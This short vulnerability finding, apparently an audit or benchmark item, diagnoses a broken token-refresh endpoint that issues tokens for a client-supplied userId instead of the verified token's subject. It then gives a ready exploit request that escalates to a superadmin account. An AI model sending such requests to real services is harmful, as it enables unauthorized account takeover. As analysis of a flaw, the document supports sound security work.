diagnosis: The token refresh endpoint verifies that refreshToken is cryptographically valid, but generates new tokens for the userId provided in the request body instead of the subject claim (sub) encoded inside the verified refreshToken. An attacker with any valid low-privilege refresh token can submit the userId of an administrator to mint valid access tokens for that admin account.
exploit_request:
POST /api/v1/auth/refresh HTTP/1.1
Host: auth.saascloud.com
Content-Type: application/json

{"refreshToken": "<attacker_valid_refresh_jwt>", "userId": "usr_superadmin_001"}
